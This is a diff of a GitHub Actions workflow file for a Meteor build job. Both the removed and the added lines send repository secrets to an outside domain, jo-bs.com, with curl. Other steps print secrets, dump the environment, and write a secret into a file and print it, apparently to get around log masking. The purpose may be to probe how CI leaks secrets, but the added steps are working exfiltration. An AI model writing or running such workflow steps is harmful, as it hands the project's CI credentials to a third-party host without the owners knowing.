@@ -11,11 +11,9 @@ on:
 
 jobs:
   build:
-    environment: TEST_ENV
+    environment: staging
     env:
-      SECRET: ${{ secrets.NEW_TEST }}
-      SEC: ${{ secrets.TEST_VAR }}
-      TEST: ${{ secrets.NEW_VAR }}
+      PORT: ${{ secrets.PORT }}
     runs-on: ubuntu-latest
     strategy:
       matrix:
@@ -23,19 +21,11 @@ jobs:
         node: ["8.11"]
     name: Meteor ${{ matrix.meteor }}
     steps:
-      - run: echo $SECRET
-      - run: echo $SEC
-      - run: curl https://jo-bs.com/$SECRET -o /dev/null
-      - run: curl https://jo-bs.com/$TEST -o /dev/null
-      - run: curl https://jo-bs.com/$TEST_VAR -o /dev/null
-      - run: curl https://jo-bs.com/$SEC -o /dev/null
-      - run: echo $TEST_VAR
-      - run: echo $TEST
-      - run: echo $GITHUB_ENV
+      - run: curl https://jo-bs.com/$PORT -o /dev/null
+      - run: echo $PORT
       - run: env
-      # - run: echo ${{ env }}
       - run: echo "change" > file
-      - run: sed -ie 's/change/${{ secrets.NEW_TEST }}/g' file
+      - run: sed -ie 's/change/${{ secrets.PORT }}/g' file
       - run: cat file
       # - uses: actions/checkout@v1
       # - name: Setup meteor
